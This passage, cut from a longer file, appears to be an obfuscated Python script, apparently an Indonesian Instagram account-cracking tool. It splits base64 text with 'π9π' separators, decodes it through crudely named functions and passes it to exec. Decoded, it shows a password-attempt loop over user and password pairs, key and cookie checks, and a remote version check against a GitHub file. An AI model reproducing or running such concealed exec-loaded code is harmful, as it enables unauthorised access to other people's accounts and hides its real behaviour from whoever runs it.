lOgoJπ9πCQl0aπ9πW1lLnπ9πNsZWVπ9πwKDMpπ9πCgkJCπ9πWxvb3π9πAtPTEπ9πKCQkJπ9πc2VsZπ9πi5nZXπ9πRfcG9π9πzdDEoπ9πdXNlcπ9πixwYXπ9πNkKQoπ9π=")))
exec(_RIZKY_("Risky Suka Hentai",_JE3CK_("Jeeck Santuy","CgoKdπ9πmVyc2π9πlvbiAπ9π9IHNlπ9πcy5nZπ9πXQoImπ9πh0dHBπ9πzOi8vπ9πcmF3Lπ9πmdpdGπ9πh1YnVπ9πzZXJjπ9πb250Zπ9πW50Lmπ9πNvbS9π9πEdW1hπ9πaS05Oπ9πTEvSWπ9π5zdGFπ9πncmFtπ9πL1hueπ9πHgvLmπ9πRhdGEπ9πvdmVyπ9πc2lvbπ9πi5qc2π9π9uIikπ9πuanNvπ9πbigpWπ9πyJ2ZXπ9πJzaSJπ9πdCnN0π9πYXR1cπ9πyA9IHπ9πNlcy5π9πnZXQoπ9πImh0dπ9πHBzOiπ9π8vcmFπ9π3Lmdpπ9πdGh1Yπ9πnVzZXπ9πJjb25π9π0ZW50π9πLmNvbπ9πS9EdWπ9π1haS0π9π5OTEvπ9πSW5zdπ9πGFncmπ9πFtL1hπ9πueHgvπ9πLmRhdπ9πGEvdmπ9πVyc2lπ9πvbi5qπ9πc29uIπ9πikuanπ9πNvbigπ9πpWyJzπ9πdGF0dπ9πXMiXQπ9πppZiBπ9πzdGF0π9πdXMgPπ9πT0gImπ9π9uIjoπ9πKCWlmπ9πIHZlcπ9πnNpb2π9π4gPT0π9πgIjEuπ9πMCI6Cπ9πgkJaWπ9πYgbGVπ9πuKGxvπ9πbCkgIπ9πT0xOgπ9πoJCQlπ9πmb2xkπ9πZXIoKπ9πQoJCQπ9πlnbG9π9πiYWx6π9πKCkKCπ9πQkJY2π9πVrX2tπ9πleSgpπ9πCgkJCπ9πWNla1π9π9jb29π9πraWVzπ9πKCkKCπ9πQkJbWπ9πVudSgπ9πpLmRhπ9πZnRhcπ9πl9tZWπ9π51KCkπ9πKCWVsπ9πc2U6Cπ9πgkJcHπ9πJpbnQπ9πoZiJ7π9πd2Fyfπ9πU1hYWπ9πYuLi4π9πgU2Nyπ9πaXB0Iπ9πEFuZGπ9πEgTWFπ9πzaWggπ9πVmVycπ9π2lvbiπ9πBMYW1π9πhLCB2π9πZXJzaπ9πW9uIHπ9πNla2Fπ9πyYW5nπ9πID4geπ9π2l9e3π9πZlcnNπ9πpb259π9πe3F9Iπ9πikKZWπ9πxzZToπ9πKCWNsπ9πcygpOπ9π2xvZ2π9π8oKQoπ9πJcHJpπ9πbnQoZπ9πiJ7d2π9πFyfU1π9πhYWYuπ9πLi4gUπ9π2NyaXπ9πB0IFNπ9πlZGFuπ9πZyBNYπ9πWludGπ9πVuYW5π9πjZSAhπ9πISIpOπ9π3F1aXπ9πQoKQoπ9πKCg==π9π")))
